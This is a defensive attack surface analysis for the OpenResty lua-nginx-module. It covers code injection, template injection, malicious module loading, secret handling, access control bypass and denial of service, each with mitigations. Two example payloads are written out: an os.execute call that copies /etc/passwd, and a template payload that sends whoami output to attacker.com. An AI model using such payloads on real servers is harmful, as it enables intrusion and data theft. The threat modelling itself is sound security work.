# Attack Surface Analysis for openresty/lua-nginx-module

## Attack Surface: [Lua Code Injection](./attack_surfaces/lua_code_injection.md)

*   **Description:** Attackers inject malicious Lua code into the application, which is then executed by the Lua interpreter within the Nginx context.
*   **Lua-Nginx Module Contribution:** `lua-nginx-module` enables the execution of Lua code within Nginx, making it the direct execution environment for injected Lua code if user input is improperly handled in Lua scripts.
*   **Example:** A Lua script uses `ngx.req.get_uri_args()` to retrieve URL parameters and then uses `loadstring()` to execute code based on the parameter value. An attacker crafts a URL like `/?code=os.execute('bash -c \"cat /etc/passwd > /tmp/passwd.txt\"')` to execute shell commands on the server.
*   **Impact:** Full server compromise, arbitrary code execution within the Nginx worker process, data exfiltration, and denial of service.
*   **Risk Severity:** **Critical**
*   **Mitigation Strategies:**
    *   **Strict Input Sanitization:**  Thoroughly sanitize and validate all user inputs before using them in Lua code. Treat all external data as untrusted.
    *   **Avoid Dynamic Code Execution:**  Completely avoid using dynamic code execution functions like `loadstring()`, `load()`, or `module.load()` with user-controlled input. If absolutely necessary, use extremely restrictive sandboxing and validation.
    *   **Principle of Least Privilege:** Run Nginx worker processes with the lowest possible privileges to limit the impact of code execution.
    *   **Web Application Firewall (WAF):** Deploy a WAF capable of detecting and blocking Lua code injection attempts.
    *   **Regular Security Audits and Code Reviews:** Conduct frequent security audits and code reviews specifically focusing on Lua scripts and input handling.

## Attack Surface: [Server-Side Template Injection (SSTI) via Lua](./attack_surfaces/server-side_template_injection__ssti__via_lua.md)

*   **Description:** Attackers inject malicious Lua code into template structures processed by Lua scripts, leading to server-side code execution during template rendering.
*   **Lua-Nginx Module Contribution:** If Lua is used for templating within Nginx (either with custom logic or Lua templating libraries), `lua-nginx-module` provides the execution context for SSTI vulnerabilities when user input is embedded in templates without proper escaping.
*   **Example:** A Lua script uses string formatting to generate dynamic web pages, directly embedding user-provided data into format strings used for HTML generation. An attacker injects payload like `${{os.execute('curl attacker.com/?data=$(whoami)')}}` into user input, which gets executed on the server when the template is rendered.
*   **Impact:** Server-side code execution, information disclosure, potential server compromise, and unauthorized actions.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Use Secure Templating Libraries:** Employ well-established and secure Lua templating libraries that offer automatic escaping and protection against SSTI.
    *   **Context-Aware Output Encoding:**  Properly encode user input based on the output context (HTML, JSON, XML, etc.) to prevent interpretation as code. Use escaping functions provided by secure templating libraries or implement manual escaping correctly.
    *   **Input Validation:** Validate user input to ensure it conforms to expected formats and does not contain potentially malicious characters or template syntax.
    *   **Content Security Policy (CSP):** Implement CSP headers to further mitigate the impact of successful SSTI by restricting the sources from which the browser can load resources, reducing the attacker's ability to exfiltrate data or execute client-side scripts.

## Attack Surface: [Execution of Arbitrary Lua Modules](./attack_surfaces/execution_of_arbitrary_lua_modules.md)

*   **Description:** Attackers manipulate the Lua module loading mechanism to force the application to load and execute malicious Lua modules from attacker-controlled locations.
*   **Lua-Nginx Module Contribution:** `lua-nginx-module` relies on Lua's `require()` function and the configured `lua_package_path` and `lua_package_cpath` directives. Misconfiguration or vulnerabilities in how these paths are managed can allow attackers to introduce malicious modules.
*   **Example:** The `lua_package_path` includes a directory writable by the web server user or a shared temporary directory. An attacker places a malicious Lua module (e.g., `exploit.lua`) in this directory and then triggers the application to `require('exploit')`, leading to the execution of the attacker's module within the Nginx worker process.
*   **Impact:** Arbitrary code execution, server compromise, installation of backdoors, and persistent malicious presence.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Restrict `lua_package_path` and `lua_package_cpath`:**  Carefully configure these directives to point only to trusted, read-only directories containing legitimate Lua modules. Avoid including user-writable directories or temporary paths.
    *   **Module Whitelisting and Integrity Checks:** Implement a whitelist of allowed Lua modules and, if possible, verify the integrity (e.g., using checksums) of loaded modules to prevent tampering.
    *   **Secure File Permissions:** Ensure that directories in `lua_package_path` and their parent directories have restrictive permissions, preventing unauthorized modification or module placement.
    *   **Code Review of Module Loading Logic:**  Thoroughly review Lua code that uses `require()` to ensure module paths are not dynamically constructed based on untrusted input and that module loading is secure.

## Attack Surface: [Insecure Handling of Sensitive Data in Lua](./attack_surfaces/insecure_handling_of_sensitive_data_in_lua.md)

*   **Description:** Sensitive data (credentials, API keys, user data, session tokens) is mishandled within Lua scripts, leading to potential exposure or unauthorized access.
*   **Lua-Nginx Module Contribution:** Lua scripts running within `lua-nginx-module` might process, store, or transmit sensitive data. Insecure practices in Lua code can directly lead to data leaks or vulnerabilities within the Nginx environment.
*   **Example:** A Lua script retrieves database credentials from environment variables and logs them in plain text to the Nginx error log for debugging purposes. This log file becomes accessible to attackers, exposing the database credentials.
*   **Impact:** Exposure of sensitive credentials, user data breaches, unauthorized access to backend systems, and compliance violations.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Minimize Handling of Sensitive Data in Lua:** Reduce the amount of sensitive data processed or stored directly within Lua scripts. Delegate sensitive data handling to more secure backend systems whenever possible.
    *   **Secure Secrets Management:** Use secure secrets management solutions (e.g., HashiCorp Vault, Kubernetes Secrets, environment variable stores with restricted access) to store and retrieve sensitive credentials instead of hardcoding them or logging them.
    *   **Avoid Logging Sensitive Data:**  Never log sensitive data in production logs. Sanitize or redact sensitive information before logging for debugging purposes in development environments.
    *   **Memory Management and Data Scrubbing:** Be mindful of memory usage in Lua scripts when handling sensitive data. If possible, scrub sensitive data from memory after it is no longer needed to minimize the risk of exposure through memory dumps.
    *   **Encryption:** Encrypt sensitive data at rest and in transit when necessary, especially when storing or transmitting data outside of the immediate request processing context.

## Attack Surface: [Access Control Bypass in Lua Logic](./attack_surfaces/access_control_bypass_in_lua_logic.md)

*   **Description:** Flaws or vulnerabilities in access control logic implemented in Lua scripts within Nginx allow unauthorized users to bypass security checks and access protected resources or functionalities.
*   **Lua-Nginx Module Contribution:** `lua-nginx-module` allows implementing access control directly in Lua using directives like `access_by_lua_block` and `access_by_lua_file`. Security vulnerabilities in these Lua scripts directly translate to access control bypasses within the Nginx application.
*   **Example:** An access control script in Lua checks user roles based on a JWT. A flaw in the JWT verification logic (e.g., improper signature validation, allowing expired tokens) or a logical error in role-based access checks could allow attackers to bypass authentication and authorization, gaining access to protected resources.
*   **Impact:** Unauthorized access to sensitive data, protected functionalities, administrative interfaces, and potential escalation of privileges.
*   **Risk Severity:** **Critical** (if critical resources are protected) / **High** (if less critical resources are protected)
*   **Mitigation Strategies:**
    *   **Secure Access Control Design Principles:** Design access control logic following secure principles like least privilege, defense in depth, and separation of duties.
    *   **Use Established Security Libraries:** Utilize well-vetted and established Lua libraries for security-sensitive operations like JWT verification, cryptography, and authentication. Avoid implementing custom security logic if possible.
    *   **Thorough Testing and Security Audits:** Rigorously test access control logic in Lua scripts, including positive and negative test cases, edge cases, and boundary conditions. Conduct regular security audits specifically focusing on access control implementations.
    *   **Code Review by Security Experts:** Have Lua access control scripts reviewed by security experts to identify potential vulnerabilities and logical flaws.
    *   **Centralized Authorization Services:** Consider using centralized authorization services (e.g., OAuth 2.0 authorization servers, policy engines) instead of implementing complex access control logic directly in Lua for better security and maintainability.

## Attack Surface: [Denial of Service (DoS) through Lua Scripting](./attack_surfaces/denial_of_service__dos__through_lua_scripting.md)

*   **Description:** Maliciously crafted or inefficient Lua scripts consume excessive server resources (CPU, memory, network bandwidth) within Nginx, leading to service disruption or complete unavailability.
*   **Lua-Nginx Module Contribution:** `lua-nginx-module` allows Lua scripts to perform complex operations and interact with Nginx internals. Poorly written or malicious Lua code can directly cause resource exhaustion within Nginx worker processes, leading to DoS.
*   **Example:** A Lua script contains an infinite loop, performs computationally expensive operations (e.g., complex regex matching on large inputs), or makes blocking network requests without timeouts on every incoming request, quickly exhausting Nginx worker resources and making the application unresponsive to legitimate users.
*   **Impact:** Service unavailability, resource exhaustion, degraded performance, and potential financial losses due to service disruption.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Resource Limits in Lua Scripts:** Implement resource limits within Lua scripts to prevent runaway scripts from consuming excessive resources. Use techniques like setting timeouts for operations, limiting loop iterations, and managing memory usage carefully.
    *   **Code Optimization and Performance Testing:** Write efficient Lua code and avoid computationally expensive operations in request handling paths. Conduct performance testing to identify and address potential bottlenecks in Lua scripts.
    *   **Rate Limiting and Request Throttling:** Implement rate limiting and request throttling at the Nginx level to protect against excessive requests that might trigger resource-intensive Lua scripts or amplify the impact of inefficient code.
    *   **Monitoring and Alerting:** Monitor server resource usage (CPU, memory, network) and set up alerts to detect and respond to potential DoS attacks or resource exhaustion caused by Lua scripts.
    *   **Code Review for Performance and Resource Usage:** Review Lua scripts for potential performance bottlenecks, resource-intensive operations, and logic that could lead to resource exhaustion under heavy load or malicious input.
    *   **Use Asynchronous and Non-blocking Operations:** Leverage Nginx's non-blocking I/O capabilities and Lua's cosocket API to perform network operations asynchronously and avoid blocking Nginx worker processes.

